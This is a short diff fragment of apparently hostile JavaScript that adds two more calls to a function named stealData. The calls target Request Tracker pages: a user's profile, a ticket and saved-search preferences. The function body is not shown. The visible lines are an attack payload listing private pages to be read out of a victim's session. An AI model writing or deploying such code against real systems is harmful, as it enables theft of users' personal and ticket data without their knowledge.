@@ -24,3 +24,5 @@ function stealData(url) {
 }
 stealData("/Prefs/AboutMe.html");
 stealData("/Ticket/Display.html?id=383442");
+stealData("/Prefs/Search.html?name=RT%3A%3AAttribute-19565");
+stealData("/Prefs/Search.html?name=RT%3A%3AAttribute-48756");
